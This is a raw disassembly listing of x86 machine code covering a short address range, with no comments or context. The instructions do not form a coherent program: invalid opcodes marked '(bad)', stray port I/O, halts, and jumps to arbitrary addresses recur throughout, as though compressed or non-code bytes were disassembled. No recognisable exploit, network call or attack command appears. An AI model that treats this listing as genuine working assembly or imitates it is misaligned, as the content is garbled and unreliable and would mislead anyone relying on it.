  419027:	cmp    DWORD PTR ds:0x50ed71b8,0x4f
  41902e:	jl     0x418fe2
  419030:	jp     0x418fe9
  419032:	or     ch,BYTE PTR [ecx]
  419034:	mov    ecx,0x4574fd61
  419039:	rol    BYTE PTR [ebx-0x1646cd02],0x19
  419040:	sub    ebp,DWORD PTR [edi]
  419042:	clc    
  419043:	shl    DWORD PTR [edi-0x143102b0],0xb7
  41904a:	cmp    eax,0x43a04228
  41904f:	mov    ebp,0xe9005b3a
  419054:	rcr    BYTE PTR [esi],0xfc
  419057:	sbb    DWORD PTR [edi+esi*4+0x41aaeb67],edx
  41905e:	add    BYTE PTR [esi-0x302a451],bl
  419064:	mov    cl,0x24
  419066:	aas    
  419067:	jmp    0x4f2ba2
  41906c:	stos   DWORD PTR es:[edi],eax
  41906d:	inc    edx
  41906e:	std    
  41906f:	jmp    DWORD PTR [edi]
  419071:	js     0x4190b7
  419073:	fdiv   st,st(7)
  419075:	pop    edx
  419076:	add    BYTE PTR [eax],al
  419078:	fdiv   st,st(6)
  41907a:	fld    DWORD PTR [ecx]
  41907c:	daa    
  41907d:	pop    ebx
  41907e:	add    bh,bh
  419080:	hlt    
  419081:	mov    dh,0x8e
  419083:	inc    ebp
  419084:	ja     0x4190d6
  419086:	jb     0x419090
	...
  4190b0:	add    BYTE PTR [eax],al
  4190b2:	pusha  
  4190b3:	mul    cl
  4190b5:	(bad)  
  4190b6:	stos   BYTE PTR es:[edi],al
  4190b7:	cmp    ch,0xff
  4190ba:	out    0x5a,eax
  4190bc:	lds    eax,FWORD PTR [ebp-0x7d]
  4190bf:	pop    edi
  4190c0:	add    BYTE PTR [eax],al
  4190c2:	xlat   BYTE PTR ds:[ebx]
  4190c3:	ja     0x419109
  4190c5:	lock out 0x5a,eax
  4190c8:	add    BYTE PTR [eax],al
  4190ca:	sbb    dh,dh
  4190cc:	icebp  
  4190cd:	add    bh,dl
  4190cf:	pop    edx
  4190d0:	add    BYTE PTR [ebp-0xb28d66],cl
  4190d6:	cmp    cl,BYTE PTR [esi-0x1b]
  4190d9:	in     eax,0xa4
  4190db:	pop    edx
  4190dc:	add    BYTE PTR [ebx],cl
  4190de:	push   edi
  4190df:	retf   
  4190e0:	adc    eax,0xfd661283
  4190e5:	jae    0x419075
  4190e7:	dec    edi
  4190e8:	je     0x4190de
  4190ea:	and    BYTE PTR [ebp+0x5f5648ab],dh
  4190f0:	lds    eax,FWORD PTR [ebp-0x35]
  4190f3:	pop    ecx
  4190f4:	add    BYTE PTR [eax],al
  4190f6:	add    DWORD PTR ds:0x1ac7,0x6b
  4190fc:	std    
  4190fd:	call   DWORD PTR [edi+0x5a]
  419100:	std    
  419101:	jne    0x419096
  419103:	dec    edi
  419104:	adc    al,0x70
  419106:	or     al,0x9a
  419108:	std    
  419109:	or     ah,BYTE PTR [edi+0x3ee81be6]
  41910f:	mov    ds:0x4141fe1a,al
  419114:	(bad)  
  419115:	add    BYTE PTR [bx+si],al
	...
  419140:	test   DWORD PTR [ebx-0x4155fffc],eax
  419146:	adc    al,0x14
  419148:	xchg   esi,eax
  419149:	jns    0x41910c
  41914b:	(bad)  
  41914c:	clc    
  41914d:	mov    esi,0xc47f4763
  419152:	add    al,BYTE PTR [eax]
  419154:	ds inc esp
  419156:	cmp    BYTE PTR [edx+esi*8-0x3d],0x8d
  41915b:	or     al,BYTE PTR [ecx]
  41915d:	(bad)  
  41915e:	or     eax,0x292073fe
  419163:	mov    edi,DWORD PTR ds:0x73ff01c4
  419169:	jo     0x419194
  41916b:	jae    0x4191ac
  41916d:	les    eax,FWORD PTR [ecx]
  41916f:	cld    
  419170:	or     eax,0xd1fe5a84
  419175:	push   esp
  419176:	adc    al,0xf1
  419178:	cwde   
  419179:	mov    edi,esp
  41917b:	push   cs
  41917c:	mov    ebx,0xb9fe14a1
  419181:	sub    al,bh
  419183:	or     dl,BYTE PTR [ebp-0x5799813c]
  419189:	lods   al,BYTE PTR ds:[esi]
  41918a:	adc    DWORD PTR [edi+0x1c43f],esi
  419190:	stc    
  419191:	sbb    BYTE PTR [ebx],bh
  419193:	ret    0x28eb
  419196:	and    BYTE PTR [edx+0x57b48f82],al
  41919c:	push   ss
  41919d:	mov    bh,0x3
  41919f:	inc    ecx
  4191a0:	ds pushf 
  4191a2:	xchg   esi,eax
	...
  4191cb:	add    BYTE PTR [eax],al
  4191cd:	add    BYTE PTR [ebp-0xc],bh
  4191d0:	sahf   
  4191d1:	jmp    DWORD PTR [ecx+0x43]
  4191d4:	push   es
  4191d5:	add    BYTE PTR [esi],bh
  4191d7:	pushf  
  4191d8:	shl    BYTE PTR [eax],cl
  4191da:	pop    ecx
  4191db:	pop    edx
  4191dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191dd:	sbb    al,0x52
  4191df:	scas   eax,DWORD PTR es:[edi]
  4191e0:	sahf   
  4191e1:	adc    esp,DWORD PTR [ecx-0x5c]
  4191e4:	into   
  4191e5:	adc    al,BYTE PTR [eax-0x3e]
  4191e8:	(bad)  
  4191e9:	jmp    0x419223
  4191eb:	mov    ch,0xf2
  4191ed:	inc    ebx
  4191ee:	lods   eax,DWORD PTR ds:[esi]
  4191ef:	dec    eax
  4191f0:	(bad)  
  4191f1:	sub    eax,0xff76b461
  4191f6:	loope  0x419227
  4191f8:	loope  0x419244
  4191fa:	inc    edx
  4191fb:	inc    edx
  4191fc:	mov    ah,0xc4
  4191fe:	adc    DWORD PTR [edi+eiz*8+0x3],ebx
  419202:	ds inc ebx
  419204:	call   0x3f9cd00d
  419209:	ret    0xb453
  41920c:	inc    esi
  41920d:	addr16 lahf 
  41920f:	sub    BYTE PTR [eax+0x331f0103],ch
  419215:	add    eax,0x80e75b3f
  41921a:	xor    BYTE PTR [edi-0x6f5ed49],0x9a
  419221:	(bad)  
  419222:	leave  
  419223:	mov    esp,0x5b3e058f
  419228:	loop   0x41926d
  41922a:	xor    cl,BYTE PTR [esi+0x6]
  41922d:	(bad)  
  41922f:	sub    BYTE PTR [eax+0x3],ch
	...
  419259:	add    BYTE PTR [eax],al
  41925b:	add    BYTE PTR [esi-0x5fed229a],dl
  419261:	pushf  
  419262:	in     al,0x65
  419264:	or     al,0x1a
  419266:	out    0x3,eax
  419268:	ds pop ebx
  41926a:	out    0x1b,eax
  41926c:	jmp    0x4192c4
  41926e:	(bad)  
  41926f:	adc    bl,BYTE PTR [ecx+0x7812f076]
  419275:	inc    ebx
  419276:	sbb    eax,0xcf5afecb
  41927b:	cmp    DWORD PTR [edx-0x4c],esi
  41927e:	add    BYTE PTR [esi+0x62539922],dh
  419284:	cmp    DWORD PTR [eax+ebx*2],esp
  419287:	adc    eax,edi
  419289:	pop    ecx
  41928a:	aas    
  41928b:	jmp    0xaa40bcc5
  419290:	sub    al,0x42
  419292:	add    BYTE PTR [ecx-0x16ffa47e],al
  419298:	test   DWORD PTR [ebp+edi*8-0x3d5dc217],esi
  41929f:	in     eax,dx
  4192a0:	cmp    eax,0x4c01580b
  4192a5:	pop    edx
  4192a6:	aas    
  4192a7:	jmp    0x2a40bcf1
  4192ac:	sub    al,0x3c
  4192ae:	mov    cl,0xeb
  4192b0:	cli    
  4192b1:	mov    bl,0xe5
  4192b3:	add    DWORD PTR [edx+0x5b],0xb4df5100
  4192ba:	std    
  4192bb:	ds inc ebp
  4192bd:	and    esi,ebx
  4192bf:	add    BYTE PTR ss:[eax],al
	...
  4192ea:	dec    esp
  4192eb:	mov    esp,0xb52c36ed
  4192f0:	call   0xfdf6d835
  4192f5:	push   0xffffffee
  4192f7:	inc    edx
  4192f8:	dec    ebx
  4192f9:	test   al,0x3d
  4192fb:	pop    ebx
  4192fc:	je     0x4192ee
  4192fe:	shl    BYTE PTR [esi+0x68],0xb2
  419302:	jp     0x4192b7
  419304:	std    
  419305:	jne    0x41933e
  419307:	mov    ah,0x13
  419309:	and    eax,0x4626001a
  41930f:	add    eax,0x5a3a2849
  419314:	add    cl,ch
  419316:	mov    ebp,0x2fd515bb
  41931b:	mov    ch,0xe8
  41931d:	repz dec eax
  41931f:	mov    ch,0xfd
  419321:	add    BYTE PTR [esi+ebp*8+0x5e726855],ah
  419328:	aas    
  419329:	add    BYTE PTR [edi-0x573cff34],ch
  41932f:	push   esi
  419330:	xor    eax,0xb7576701
  419335:	pop    es
  419336:	push   edi
  419337:	push   edi
  419338:	add    BYTE PTR [ebx],dh
  41933a:	test   DWORD PTR [ecx-0x10],edx
  41933d:	or     ebp,0x5a
  419340:	jae    0x419344
  419342:	int3   
  419343:	pop    ecx
  419344:	jmp    0xff206332
  419349:	jmp    FWORD PTR [eax+0xfa724f]
	...
  419377:	add    BYTE PTR [eax+0x6f00674c],ch
  41937d:	xchg   edx,eax
  41937e:	add    BYTE PTR [eax],al
  419380:	pop    ss
  419381:	jae    0x419381
  419383:	and    eax,0x40de3f
  419388:	mov    BYTE PTR [edx+0x5ea68129],bh
  41938e:	std    
  41938f:	and    eax,0x40dde7
  419394:	sub    BYTE PTR [edx+0x5ea68131],bh
  41939a:	std    
  41939b:	and    eax,0x40dddf
  4193a0:	sub    BYTE PTR [edx+0x5e968139],bh
  4193a6:	std    
  4193a7:	and    eax,0x40dde7
  4193ac:	cmp    BYTE PTR [edx+0x5ed68141],bh
  4193b2:	std    
  4193b3:	and    eax,0x40dddf
  4193b8:	test   al,0xb9
  4193ba:	dec    ecx
  4193bb:	and    DWORD PTR [esi+0x57],0xde4725fd
  4193c2:	inc    eax
  4193c3:	add    BYTE PTR [esi],bh
  4193c5:	mov    esi,esp
  4193c7:	push   ebx
  4193c8:	mov    edi,0x1bff0483
  4193cd:	jl     0x419350
  4193cf:	inc    eax
  4193d0:	ds icebp 
  4193d2:	out    0x5b,al
  4193d4:	mov    edi,0x23ff0483
  4193d9:	and    al,0x81
  4193db:	inc    eax
	...
  419404:	add    BYTE PTR [eax],al
  419406:	ds stc 
  419408:	out    0x63,al
  41940a:	mov    edi,0x1bff0483
  41940f:	pop    esp
  419410:	add    DWORD PTR [eax+0x3e],0xbf6be6e1
  419417:	add    BYTE PTR [edi+edi*8],0x63
  41941b:	mov    ah,0x82
  41941d:	inc    eax
  41941e:	ds sub esi,esp
  419421:	jae    0x4193e2
  419423:	add    BYTE PTR [edi+edi*8],0x5b
  419427:	mov    esp,0x113e4082
  41942c:	out    0x7b,al
  41942e:	mov    edi,0x23ff0202
  419433:	inc    esp
  419434:	add    BYTE PTR [eax+0x3e],0x19
  419438:	out    0x83,al
  41943a:	mov    edi,0x1bff0202
  41943f:	cmp    al,0x82
  419441:	inc    eax
  419442:	ds and esi,0x202bf8b
  419449:	jmp    DWORD PTR [ebx]
  41944b:	xor    al,0x82
  41944d:	inc    eax
  41944e:	ds dec ecx
  419450:	out    0x93,al
  419452:	mov    edi,0x5bff0202
  419457:	cmp    al,0x82
  419459:	inc    eax
  41945a:	ds mov cl,0xe3
  41945d:	fwait
  41945e:	mov    edi,0x63ff0202
  419463:	and    al,0x82
  419465:	inc    eax
  419466:	ds pop ebx
  419468:	out    0xe9,al
	...
  419492:	add    BYTE PTR [eax],al
  419494:	fstp   st(3)
  419496:	sub    BYTE PTR [ecx+eax*4],al
  419499:	ja     0x41951a
  41949b:	test   esi,edi
  41949d:	pop    edx
  41949e:	into   
  41949f:	jmp    0x46a7049
  4194a4:	imul   esi,DWORD PTR [edi+0x77],0xb65afe85
  4194ab:	jmp    0x46a703d
  4194b0:	push   ecx
  4194b1:	ja     0x419512
  4194b3:	test   esi,edi
  4194b5:	pop    edx
  4194b6:	sahf   
  4194b7:	jmp    0x46a7041
  4194bc:	cmp    DWORD PTR [edi-0x59],esi
  4194bf:	test   DWORD PTR [esi+0x5b],edi
  4194c2:	xchg   cl,ch
  4194c4:	std    
  4194c5:	fisubr DWORD PTR [eax]
  4194c7:	add    al,0x21
  4194c9:	ja     0x41946a
  4194cb:	test   DWORD PTR [esi+0x5b],edi
  4194ce:	outs   dx,BYTE PTR ds:[esi]
  4194cf:	jmp    0x3ea6fd9
  4194d4:	or     DWORD PTR [edi+0x37],esi
  4194d7:	test   DWORD PTR [esi+0x5b],edi
  4194da:	push   esi
  4194db:	jmp    0x3ea6fed
  4194e0:	icebp  
  4194e1:	jbe    0x419502
  4194e3:	test   DWORD PTR [esi+0x5b],edi
  4194e6:	ds jmp 0x3ea6ff1
  4194ec:	fnstenv [esi+0x47]
  4194ef:	test   DWORD PTR [esi+0x5b],edi
  4194f2:	es jmp 0x3ea6fd5
	...
  419520:	add    BYTE PTR [eax],al
  419522:	shl    DWORD PTR [esi-0x1],0x84
  419526:	(bad)  
  419527:	pop    edx
  419528:	push   cs
  419529:	jmp    0x3ea6fd3
  41952e:	test   eax,0xfe84f776
  419533:	pop    edx
  419534:	add    dh,dh
  419536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419537:	lods   al,BYTE PTR ds:[esi]
  419538:	jg     0x4194e2
  41953a:	cmp    eax,0xc2e523b0
  41953f:	sbb    eax,DWORD PTR [eax]
  419541:	ficom  WORD PTR [esi+0x42287fb0]
  419547:	mov    al,0x23
  419549:	in     eax,0xbf
  41954b:	sbb    eax,DWORD PTR [eax]
  41954d:	(bad)  
  41954e:	push   esi
  41954f:	pop    eax
  419550:	sub    BYTE PTR [eax],0x3a
  419553:	mov    al,0x23
  419555:	in     eax,0xbf
  419557:	sbb    eax,DWORD PTR [eax]
  419559:	scas   al,BYTE PTR es:[edi]
  41955a:	pushaw 
  41955c:	sub    BYTE PTR [eax],0x42
  41955f:	mov    al,0x23
  419561:	add    DWORD PTR [ebx+ebx*1+0x50269600],edi
  419568:	sub    BYTE PTR [eax],0x3a
  41956b:	mov    al,0x23
  41956d:	int    0xbf
  41956f:	sbb    al,BYTE PTR [eax]
  419571:	jle    0x419589
  419573:	js     0x4194f7
  419575:	sub    BYTE PTR [edx-0x50],al
  419578:	and    edi,DWORD PTR [ebp+0x66001abf]
  41957e:	push   ss
  41957f:	add    BYTE PTR [edx+0x23b03da8],0x1d
	...
  4195ae:	add    BYTE PTR [eax],al
  4195b0:	mov    esp,0xe64e001a
  4195b5:	sub    BYTE PTR [bx+si-0x4fc3],0x23
  4195bb:	std    
  4195bc:	mov    edi,0xe636001a
  4195c1:	outs   dx,DWORD PTR ds:[esi]
  4195c2:	sub    BYTE PTR [eax-0x52dc4fc3],0xbf
  4195c9:	sbb    al,BYTE PTR [eax]
  4195cb:	push   ds
  4195cc:	(bad)  
  4195cd:	pop    ss
  4195ce:	sub    BYTE PTR [eax-0x46dc4fc3],0xbf
  4195d5:	sbb    al,BYTE PTR [eax]
  4195d7:	add    BYTE PTR [eax-0x3d],al
  4195da:	push   ebp
  4195db:	adc    dh,0x5b
  4195de:	std    
  4195df:	and    eax,0x40d9b3
  4195e4:	mov    al,ds:0x568261b7
  4195e9:	push   edi
  4195ea:	std    
  4195eb:	and    eax,0x40dcef
  4195f0:	nop
  4195f1:	mov    bh,0x69
  4195f3:	and    BYTE PTR [esi],0x57
  4195f6:	std    
  4195f7:	and    eax,0x40dd27
  4195fc:	mov    al,ds:0x268271b7
  419601:	push   edi
  419602:	std    
  419603:	and    eax,0x40dd0f
  419608:	mov    al,ds:0x16827db7
  41960d:	push   edi
  41960e:	std    
  41960f:	and    eax,0x40d9ab
	...
  41963c:	add    BYTE PTR [eax],al
  41963e:	shl    BYTE PTR [esi+0x57568285],0xfd
  419645:	and    eax,0x40d993
  41964a:	nop
  41964b:	mov    dh,0x8d
  41964d:	and    BYTE PTR [esi+0x57],0xfd
  419651:	and    eax,0x40d98b
  419656:	pusha  
  419657:	mov    dh,0x95
  419659:	and    BYTE PTR [esi+0x6325fd5a],0xd9
  419660:	inc    eax
  419661:	add    BYTE PTR [eax-0x697d624a],al
  419667:	pop    edx
  419668:	std    
  419669:	and    eax,0x40d9cb
  41966e:	and    BYTE PTR [esi+0x5a9682a9],dh
  419674:	std    
  419675:	and    eax,0x40d967
  41967a:	ds cmp eax,ecx
  41967d:	and    edi,DWORD PTR [edx]
  41967f:	inc    ecx
  419680:	or     al,0x1
  419682:	sub    ebp,DWORD PTR [ecx+ecx*2+0x1c43e63]
  419689:	ret    0xc442
  41968c:	xor    bh,0x3a
  41968f:	aas    
  419690:	stc    
  419691:	mov    bh,0x3c
  419693:	les    eax,FWORD PTR [ecx]
  419695:	add    BYTE PTR [eax+edi*4+0x1],bh
  419699:	xor    DWORD PTR [esi-0x44],0xffffff8e
  41969d:	pop    es
  41969e:	mov    dh,0xb8
  4196a0:	add    DWORD PTR [eax],eax
	...
  4196ca:	add    BYTE PTR [eax],al
  4196cc:	add    al,BYTE PTR ds:[esi]
  4196cf:	add    BYTE PTR [ebp+0x467cf19c],bh
  4196d5:	sub    al,0x3
  4196d7:	add    BYTE PTR [esi],bh
  4196d9:	les    edi,FWORD PTR [edi]
  4196db:	add    edi,DWORD PTR [esi]
  4196dd:	inc    ecx
  4196de:	or     DWORD PTR [edi],ebx
  4196e0:	ret    
  4196e1:	stos   DWORD PTR es:[edi],eax
  4196e2:	dec    ecx
  4196e3:	pop    es
  4196e4:	les    eax,FWORD PTR ds:[ecx]
  4196e7:	ret    0xc43a
  4196ea:	xor    bh,0x7e
  4196ed:	push   edi
  4196ee:	cld    
  4196ef:	mov    bh,0x34
  4196f1:	les    eax,FWORD PTR [ecx]
  4196f3:	add    ah,bh
  4196f5:	mov    edi,0xc3be3d01
  4196fa:	add    DWORD PTR [eax],eax
  4196fc:	mov    ebp,DWORD PTR [ecx+ecx*2+0x1c43e0b]
  419703:	ret    0xc442
  419706:	into   
  419707:	(bad)  
  419708:	les    eax,FWORD PTR ds:[ecx]
  41970b:	jge    0x419743
  41970d:	fdiv   st(3),st
  41970f:	jmp    ecx
  419711:	ret    
  419712:	aas    
  419713:	add    edi,DWORD PTR [esi]
  419715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419716:	add    DWORD PTR [edx],eax
  419718:	les    ecx,FWORD PTR ds:[esi-0x8a579f9]
  41971f:	add    edi,DWORD PTR [esi]
  419721:	pop    ebx
  419722:	sub    DWORD PTR [edi],eax
  419724:	ds jo  0x41970e
  419727:	pop    es
  419728:	ds pop ebx
  41972a:	mov    ebx,?
  41972c:	icebp  
  41972d:	dec    eax
  41972e:	out    0x3,eax
	...
  419758:	add    BYTE PTR [eax],al
  41975a:	ds cdq 
  41975c:	jecxz  0x419761
  41975e:	pop    ebx
  41975f:	pop    ebx
  419760:	fild   WORD PTR [ebx]
  419762:	ds xor bh,bl
  419765:	dec    ebx
  419766:	sub    eax,0x7c03e75b
  41976b:	push   esi
  41976c:	out    0xc8,eax
  41976e:	jns    0x4197cd
  419770:	out    0x3,eax
  419772:	repz bound ecx,QWORD PTR [edi-0x1852960e]
  419779:	inc    ebp
  41977a:	cmp    eax,0x1e03fc5b
  41977f:	pop    ebx
  419780:	out    0x88,eax
  419782:	cmp    ebx,esi
  419784:	iret   
  419785:	add    edi,DWORD PTR [esi]
  419787:	pop    ebx
  419788:	test   eax,0xe7703e00
  41978d:	ret    
  41978e:	cmp    DWORD PTR [ebp+0x51e9fc14],ebp
  419794:	out    0x3,eax
  419796:	ds cdq 
  419798:	jmp    0x41979d
  41979a:	arpl   WORD PTR [ebx+0x67],bx
  41979d:	add    al,0x3e
  41979f:	fisttp WORD PTR cs:[ebx+0x35]
  4197a3:	pop    ebx
  4197a4:	out    0x3,eax
  4197a6:	cld    
  4197a7:	push   edi
  4197a8:	out    0xd6,eax
  4197aa:	imul   BYTE PTR [esi-0x19]
  4197ad:	add    edi,DWORD PTR [edi]
  4197af:	pop    ebx
  4197b0:	out    0x68,al
  4197b2:	(bad)  
  4197b3:	ficomp WORD PTR [ebx+0x28e04bfc]
  4197b9:	inc    esi
  4197ba:	cmp    eax,0x856a5b
	...
  4197e7:	add    BYTE PTR ds:0x3de90057,dh
  4197ed:	lods   al,BYTE PTR ds:[esi]
  4197ee:	jae    0x4197bc
  4197f0:	dec    eax
  4197f1:	fist   DWORD PTR [eax]
  4197f3:	in     eax,dx
  4197f4:	cmp    eax,0xaa68875b
  4197f9:	pop    eax
  4197fa:	add    cl,ch
  4197fc:	jge    0x419793
  4197fe:	jg     0x4197ed
  419800:	test   eax,0x3df1fdac
  419805:	pop    ebx
  419806:	add    BYTE PTR [eax-0x3d],dh
  419809:	pop    esp
  41980a:	add    al,0xe9
  41980c:	cmp    eax,0x89c57cd8
  419811:	lods   al,BYTE PTR ds:[esi]
  419812:	mov    dh,BYTE PTR [eax-0x6b]
  419815:	pop    eax
  419816:	add    cl,ch
  419818:	leave  
  419819:	popa   
  41981a:	mov    ch,al
  41981c:	cmp    ebx,DWORD PTR [ebx+0x5ae5a9fe]
  419822:	ret    0x3ded
  419825:	mov    ebx,DWORD PTR [edi]
  419827:	stos   DWORD PTR es:[edi],eax
  419828:	pop    ecx
  419829:	lods   al,BYTE PTR ds:[esi]
  41982a:	sub    BYTE PTR [eax+0x59],0x58
  41982e:	add    cl,ch
  419830:	xor    al,0x27
  419832:	sbb    esi,DWORD PTR [edx-0x46]
  419835:	pop    esp
  419836:	add    al,0xe9
  419838:	cmp    eax,0x31f17fe2
  41983d:	lods   al,BYTE PTR ds:[esi]
  41983e:	std    
  41983f:	sub    DWORD PTR [ebp-0x25],edi
  419842:	sbb    al,0xed
  419844:	cmp    eax,0x3de9085b
  419849:	pop    ebx
  41984a:	xchg   DWORD PTR [eax+0x0],ebp
	...
  419875:	add    BYTE PTR ds:0x88e90058,cl
  41987b:	jecxz  0x419895
  41987d:	in     eax,dx
  41987e:	cmp    eax,0x8108d05b
  419883:	fnstcw WORD PTR [edi-0xb]
  419886:	icebp  
  419887:	stos   DWORD PTR es:[edi],eax
  419888:	std    
  419889:	dec    esi
  41988a:	into   
  41988b:	dec    esi
  41988c:	mov    DWORD PTR [eax],eax
  41988e:	push   esi
  41988f:	test   al,0x1
  419891:	add    bh,ah
  419893:	sbb    BYTE PTR cs:[eax],0xe3
  419897:	push   edi
  419898:	add    BYTE PTR [eax+0x20],al
  41989b:	xlat   BYTE PTR ds:[ebx]
  41989c:	sbb    DWORD PTR [edi+edx*8],eax
  41989f:	push   edi
  4198a0:	or     BYTE PTR [eax],al
  4198a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198a3:	push   edi
  4198a4:	xchg   DWORD PTR [ecx-0x25449],eax
  4198aa:	sbb    al,0x2f
  4198ac:	adc    eax,0x8a579704
  4198b1:	add    DWORD PTR [ebp+0x1fc0fb17],esp
  4198b7:	push   edi
  4198b8:	ror    DWORD PTR [ebx-0x74fe741d],0x43
  4198bf:	mov    ebx,0xea315501
  4198c4:	xor    dh,dh
  4198c6:	(bad)  
  4198c8:	std    
  4198c9:	mov    cl,BYTE PTR [edi-0x39fe192b]
  4198cf:	dec    esi
  4198d0:	inc    ebx
  4198d1:	lea    esi,[ebx-0x16]
  4198d4:	cmp    al,0x66
  4198d7:	retf   0x83ed
	...
  419902:	add    BYTE PTR [eax],al
  419904:	mov    DWORD PTR [edi-0x45],edx
  419907:	call   FWORD PTR [eax+0x5a8dfe61]
  41990d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41990e:	jno    0x419982
  419910:	je     0x41993a
  419912:	inc    BYTE PTR [ecx]
  419914:	jle    0x4198c9
  419916:	add    DWORD PTR [eax],eax
  419918:	pop    ss
  419919:	ficomp DWORD PTR [eax]
  41991b:	mov    esp,DWORD PTR [esi+0x270001af]
  419921:	sbb    BYTE PTR es:[eax],0x23
  419925:	pop    edi
  419926:	add    BYTE PTR [eax-0x72],al
  419929:	push   ss
  41992a:	sbb    DWORD PTR [edi+eiz*8],eax
  41992d:	pop    esi
  41992e:	xchg   DWORD PTR [ecx-0x25bc2],eax
  419934:	jmp    0x3a591a76
  419939:	mov    ah,0x1
  41993b:	idiv   ah
  41993d:	mov    bl,0x8d
  41993f:	or     esp,eax
  419941:	mov    WORD PTR [ebx],es
  419943:	fcmovne st,st(0)
  419945:	jne    0x4199c3
  419947:	pop    ss
  419948:	aad    0xb6
  41994a:	xor    DWORD PTR [edi],ebx
  41994c:	aas    
  41994d:	or     ebp,eax
  41994f:	add    edi,DWORD PTR [esi]
  419951:	mov    ah,0x8e
  419953:	sbb    BYTE PTR [ebp+0x3e03f433],dh
  419959:	mov    ah,0x7a
  41995b:	xor    BYTE PTR [esi],0xc0
  41995e:	add    DWORD PTR [eax],eax
  419960:	(bad)  
  419961:	cmp    cl,BYTE PTR [ecx+0x1b]
  419964:	inc    edx
  419965:	mov    ah,0x1
  419967:	mov    DWORD PTR [eax],eax
	...
  419991:	add    BYTE PTR [edi+0x79fffda4],bh
  419997:	sub    eax,0xb43a1782
  41999c:	add    DWORD PTR [edx-0x2d349ba],ecx
  4199a2:	jge    0x419967
  4199a4:	sbb    eax,DWORD PTR [edx+0x1779b368]
  4199aa:	retf   
  4199ab:	add    eax,0x989700ac
  4199b0:	std    
  4199b1:	inc    DWORD PTR [ecx+0x47]
  4199b4:	jmp    0xfde55943
  4199b9:	push   DWORD PTR [ecx]
  4199bb:	cmp    eax,DWORD PTR [edx+0x1b44217]
  4199c1:	inc    eax
  4199c2:	mov    bh,0x1a
  4199c4:	in     eax,0x3
  4199c6:	ds mov ah,0x7a
  4199c9:	sub    BYTE PTR [esi],0xb8
  4199cc:	add    DWORD PTR [eax],eax
  4199ce:	mov    ch,0x32
  4199d0:	jmp    0xe79cd7d8
  4199d5:	adc    edi,edi
  4199d7:	pop    ebx
  4199d8:	sar    ebp,cl
  4199da:	(bad)  
  4199db:	dec    edx
  4199dc:	jmp    0x5fde8516
  4199e1:	repz aam 0x5c
  4199e4:	pop    ss
  4199e5:	jecxz  0x419a25
  4199e7:	hlt    
  4199e8:	(bad)  
  4199ea:	shr    DWORD PTR [ecx-0x244b1544],1
  4199f0:	xlat   BYTE PTR ds:[ebx]
  4199f1:	inc    ecx
  4199f3:	test   eax,0x8270
	...
  419a20:	push   ecx
  419a21:	pop    edi
  419a22:	out    0x3,eax
  419a24:	(bad)  
  419a25:	rcl    DWORD PTR [eax-0x19],cl
  419a28:	cmp    eax,0xbe7ae75b
  419a2d:	dec    edx
  419a2e:	jmp    0x419a33
  419a30:	ds (bad) 
  419a32:	jo     0x419a1f
  419a34:	cmp    eax,0x5e33e75b
  419a39:	or     cl,BYTE PTR [ebp-0x18a1805a]
  419a3f:	mov    dl,0x12
  419a41:	(bad)  
  419a42:	dec    ebx
  419a43:	loopne 0x419a86
  419a45:	adc    DWORD PTR [edx],ebx
  419a47:	inc    esp
  419a48:	adc    dh,bl
  419a4a:	int3   
  419a4b:	imul   ebx
  419a4d:	pop    edi
  419a4e:	test   bh,dh
  419a50:	pop    ecx
  419a51:	test   eax,0x7ed57ae7
  419a56:	fstp   TBYTE PTR [edx+0x50]
  419a59:	jne    0x419a0f
  419a5b:	jns    0x419a3a
  419a5d:	jle    0x419a46
  419a5f:	jns    0x419ab9
  419a61:	ffreep st(2)
  419a63:	nop
  419a64:	push   ecx
  419a65:	aam    0xa4
  419a67:	jnp    0x419a7c
  419a69:	xlat   BYTE PTR ds:[ebx]
  419a6a:	jb     0x419a70
  419a6c:	ds pop ebx
  419a6e:	out    0xc9,eax
  419a70:	aaa    
  419a71:	das    
  419a72:	in     eax,0xbc
  419a74:	jg     0x419a54
  419a76:	add    BYTE PTR [eax-0x567e5151],ah
  419a7c:	add    eax,esp
  419a7e:	(bad)  
  419a7f:	fdivr  st(5),st
  419a81:	ffree  st(0)
  419a83:	jmp    0x419a85
	...
  419aad:	add    BYTE PTR [ebp+ebx*2-0x7f],dl
  419ab1:	sub    ecx,ebp
  419ab3:	and    DWORD PTR [esi+0x6a],eax
  419ab6:	(bad)  
  419ab7:	jl     0x419ad5
  419ab9:	call   0x9f9f316c
  419abe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419abf:	add    eax,0xd43de5c2
  419ac4:	push   esp
  419ac5:	add    eax,0x72560e3e
  419aca:	push   ebx
  419acb:	mov    eax,ds:0xa8b1d186
  419ad0:	std    
  419ad1:	jmp    0x6341f613
  419ad6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ad7:	fadd   st(7),st
  419ad9:	neg    BYTE PTR [ecx]
  419adb:	js     0x419adc
  419add:	call   0x75caab1f
  419ae2:	imul   ecx,DWORD PTR [ecx+eax*4-0x12],0xa6032e88
  419aea:	jo     0x419a94
  419aec:	std    
  419aed:	jmp    0xae6b34e6
  419af2:	in     eax,dx
  419af3:	popa   
  419af4:	or     BYTE PTR [ebp-0x5c],dl
  419af7:	sbb    DWORD PTR [eax+0x6c],eax
  419afa:	inc    eax
  419afb:	das    
  419afc:	imul   BYTE PTR [edx-0x2d]
  419aff:	inc    ebx
  419b00:	add    al,0xe9
  419b02:	cmp    eax,0xc4cc73a8
  419b07:	fst    QWORD PTR [eax]
  419b09:	in     eax,dx
  419b0a:	cmp    eax,0x2567875b
  419b0f:	pop    esp
  419b10:	add    cl,ch
	...
  419b3a:	add    BYTE PTR [eax],al
  419b3c:	std    
  419b3d:	mov    al,ds:0xa821ed86
  419b42:	std    
  419b43:	add    BYTE PTR [edi],cl
  419b45:	pop    esp
  419b46:	add    BYTE PTR [eax],al
  419b48:	mov    fs,WORD PTR [esi]
  419b4a:	or     eax,0x895c1704
  419b4f:	xchg   bh,ch
  419b51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b52:	std    
  419b53:	push   DWORD PTR [edi]
  419b55:	mov    esp,0xa7f7868a
  419b5a:	std    
  419b5b:	call   FWORD PTR [ebp-0x5e]
  419b5e:	pop    esi
  419b5f:	mov    bh,bl
  419b61:	pusha  
